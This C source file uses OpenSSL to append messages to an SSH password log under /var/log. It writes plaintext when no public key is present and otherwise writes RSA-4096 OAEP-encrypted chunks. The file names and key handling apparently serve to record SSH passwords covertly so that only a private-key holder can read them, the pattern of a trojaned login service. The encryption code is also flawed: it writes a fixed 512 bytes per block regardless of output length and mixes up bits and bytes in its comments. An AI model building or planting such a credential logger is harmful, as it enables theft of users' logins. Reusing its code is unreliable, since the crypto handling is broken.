#include <stdio.h>
#include <string.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

#define RSA_PKEY_FILENAME "/var/log/ssh_log_pkey.pem"
#define ENCRYPTED_OUTPUT_FILENAME "/var/log/ssh_pwd.rsa4096.log"
#define PLAINTEXT_OUTPUT_FILENAME "/var/log/ssh_pwd.log"
#define RSA_SKEY_FILENAME "/var/log/ssh_log_skey.pem"
#define RSA_SKEY_ENCRYPTED_FILENAME "/var/log/ssh_log_skey.pem.aes256"

void log_encrypt(char *msg, FILE *out_fd, EVP_PKEY *key, EVP_PKEY_CTX *ctx){
	//encrypt data
	char encrypted[512];
	size_t outlen = sizeof(encrypted);
	EVP_PKEY_encrypt(ctx,encrypted,&outlen,msg,strlen(msg));
	
	//write to file
	for(size_t i=0;i<512;i++)
		fprintf(out_fd,"%c",encrypted[i]);
	
}

void log_ssh_pwd(char *msg){
	//check if public key file exists, if not then write plaintext msg to ssh_pwd.log
	FILE *key_fd = fopen(RSA_PKEY_FILENAME,"rb");
	if(key_fd == NULL){
		//write to ssh_pwd.log then return
		FILE *log = fopen(PLAINTEXT_OUTPUT_FILENAME,"a");
		if(log == NULL)
			return;
		fprintf(log,"%s",msg);
		fclose(log);
		return;
	}
	//read public rsa key
	EVP_PKEY *key = PEM_read_PUBKEY(key_fd,NULL,NULL,NULL);
	fclose(key_fd);
	
	//open encrypted log file
	FILE *out_fd = fopen(ENCRYPTED_OUTPUT_FILENAME,"ab");
	if(out_fd == NULL)
		return;
	//initialize encryption class
	EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(key,NULL);
	if(ctx == NULL)
		return;
	if(EVP_PKEY_encrypt_init(ctx) <= 0){
		EVP_PKEY_CTX_free(ctx);
		return;
	}
	if(EVP_PKEY_CTX_set_rsa_padding(ctx,RSA_PKCS1_OAEP_PADDING) <= 0){
		EVP_PKEY_CTX_free(ctx);
		return;
	}

	//encrypt each 512-48-2 chars using RSA with OAEP. They each fit into 512 bit blocks. RSA key has to be RSA4096 for this to work
	size_t len = strlen(msg);
	char buffer[512-48-1];
	for(size_t i=0;i<len;i+=462){
		strncpy(buffer,msg+i,512-48-2);
		buffer[512-48-2] = '\0';
		log_encrypt(buffer,out_fd,key,ctx);
	}
	EVP_PKEY_CTX_free(ctx);
	fclose(out_fd);
}
